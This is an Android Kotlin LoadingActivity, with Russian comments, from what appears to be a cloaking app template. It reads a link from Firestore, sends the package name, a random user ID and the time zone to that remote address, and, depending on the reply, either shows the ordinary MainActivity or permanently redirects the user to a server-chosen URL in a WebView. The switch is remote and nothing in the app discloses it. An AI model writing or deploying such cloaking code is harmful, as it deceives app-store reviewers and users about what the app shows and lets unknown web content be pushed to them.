package com.template

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.view.WindowInsets
import android.view.WindowInsetsController
import android.view.WindowManager
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebResourceResponse
import android.webkit.WebView
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.android.gms.tasks.OnCompleteListener
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.FirebaseMessaging
import com.template.databinding.ActivityLoadingBinding
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.BufferedReader
import java.io.IOException
import java.io.InputStreamReader
import java.net.URL
import java.util.TimeZone
import java.util.UUID

class LoadingActivity : AppCompatActivity() {

    private var prefStateFireBase: SharedPreferences? = null
    private var prefStateBd: SharedPreferences? = null

    private lateinit var binding: ActivityLoadingBinding
    private val db = Firebase.firestore

    private lateinit var webView: WebView

    @RequiresApi(Build.VERSION_CODES.M)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityLoadingBinding.inflate(layoutInflater)
        setContentView(binding.root)
        setFullscreen()
        if (!isOnline(this)) {
            val intent = Intent(this@LoadingActivity, MainActivity::class.java)
            startActivity(intent)
        } else {

            FirebaseMessaging.getInstance().token.addOnCompleteListener(OnCompleteListener { task ->
                if (!task.isSuccessful) {
                    Log.d("MyTag", "Fetching FCM registration token failed", task.exception)
                    return@OnCompleteListener
                }


                // Get new FCM registration token
                val token = task.result

                Log.d("MyTag", token)

            })


            prefStateFireBase =
                getSharedPreferences(Constants.PREF_STATE_FIRE_BASE, Context.MODE_PRIVATE)

            prefStateBd =
                getSharedPreferences(Constants.PREF_STATE_BD, Context.MODE_PRIVATE)

            webView = findViewById(R.id.webView)
            webView.settings.javaScriptEnabled = true

            val stateFireBase = prefStateFireBase?.getString(Constants.SAVE_STATE_FIRE_BASE, "")
            val stateBd = prefStateBd?.getString(Constants.SAVE_STATE_BD, "")

            if (stateFireBase == "" && stateBd == "") {

                db.collection("database").document("check")
                    .get()
                    .addOnSuccessListener { document ->

                        if (document.data != null) {

                            if (document.data.toString().contains("h")) {
                                saveStateFireBase(document.data.toString().dropWhile { it != 'h' }
                                    .dropLast(1))

                                //открываем сайт с ссылкой
                                webView.loadUrl(setLink(document.data.toString().dropWhile { it != 'h' }
                                    .dropLast(1)))


                                CoroutineScope(Dispatchers.Default).launch {

                                    val getLink = getUrlSource(setLink(document.data.toString().dropWhile { it != 'h' }
                                        .dropLast(1)))

                                    if (getLink.contains("http", true)) {
                                        val intent =
                                            Intent(this@LoadingActivity, WebActivity::class.java)
                                        intent.putExtra(Constants.SEND_LINK_IN_WEB_VIEW, getLink)
                                        startActivity(intent)

                                    } else {
                                        val intent =
                                            Intent(this@LoadingActivity, MainActivity::class.java)
                                        startActivity(intent)
                                    }
                                    saveStateBd(getLink)
                                }
                            } else {
                                saveStateFireBase("Nothing")
                                val intent = Intent(this@LoadingActivity, MainActivity::class.java)
                                startActivity(intent)
                            }

                        } else {
                            saveStateFireBase("Error")
                            val intent = Intent(this@LoadingActivity, MainActivity::class.java)
                            startActivity(intent)
                        }
                    }
                    .addOnFailureListener {
                        saveStateFireBase("Error")
                        val intent = Intent(this@LoadingActivity, MainActivity::class.java)
                        startActivity(intent)
                    }

            } else {
                if (stateFireBase?.contains("h") == true && stateBd?.contains("h") == true) {
                    val intent = Intent(this@LoadingActivity, WebActivity::class.java)
                    intent.putExtra(Constants.SEND_LINK_IN_WEB_VIEW, stateBd)
                    startActivity(intent)
                } else {
                    val intent = Intent(this@LoadingActivity, MainActivity::class.java)
                    startActivity(intent)
                }
            }
        }

    }

    // обработка данных из БД
    private fun getUrlSource(site: String): String {
        try {
            if (site.contains("http", true)) {
                val url = URL(site)
                val urlConnection = url.openConnection()
                val bufferedReader = BufferedReader(
                    InputStreamReader(
                        urlConnection.getInputStream(), "UTF-8"
                    )
                )
                var inputLine: String?
                val stringBuilder = StringBuilder()
                while (bufferedReader.readLine().also { inputLine = it } != null) stringBuilder.append(
                    inputLine
                )
                bufferedReader.close()
                return stringBuilder.toString()
            } else {
                saveStateBd("Empty Bd")
                val intent = Intent(this@LoadingActivity, MainActivity::class.java)
                startActivity(intent)
                return ""
            }
        } catch (e:Exception){
            val intent = Intent(this@LoadingActivity, MainActivity::class.java)
            startActivity(intent)
            return ""
        }

    }

    // формируем ссылку для обращения в ФБ
    private fun setLink(link: String): String {

        val pack = this.packageName
        val uuid = UUID.randomUUID().toString()
        val timeZone = TimeZone.getDefault().toString().substringAfter('"')

        return "$link/?packageid=$pack&usserid=$uuid&getz=${timeZone.substringBeforeLast('"')}&getr=utm_source=google-play&utm_medium=organic"
    }

    // сохранение состояние ФБ
    private fun saveStateFireBase(string: String) {
        val editor = prefStateFireBase?.edit()
        editor?.putString(Constants.SAVE_STATE_FIRE_BASE, string)
        editor?.apply()
    }

    // сохранение состояние БД
    private fun saveStateBd(string: String) {
        val editor = prefStateBd?.edit()
        editor?.putString(Constants.SAVE_STATE_BD, string)
        editor?.apply()
    }

    // проверка состояния сети пользователя
    @RequiresApi(Build.VERSION_CODES.M)
    fun isOnline(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val capabilities =
            connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)

        if (capabilities != null) {
            if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                Log.i("Internet", "NetworkCapabilities.TRANSPORT_CELLULAR")
                return true
            } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                Log.i("Internet", "NetworkCapabilities.TRANSPORT_WIFI")
                return true
            } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)) {
                Log.i("Internet", "NetworkCapabilities.TRANSPORT_ETHERNET")
                return true
            }
        }
        return false
    }

    private fun setFullscreen() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            window.attributes.layoutInDisplayCutoutMode =
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.setDecorFitsSystemWindows(false)
            window.insetsController?.apply {
                hide(WindowInsets.Type.statusBars() or WindowInsets.Type.navigationBars())
                systemBarsBehavior = WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            @Suppress("DEPRECATION")
            window.decorView.systemUiVisibility = (View.SYSTEM_UI_FLAG_FULLSCREEN
                    or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    or View.SYSTEM_UI_FLAG_IMMERSIVE
                    or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION)
        }
    }

}

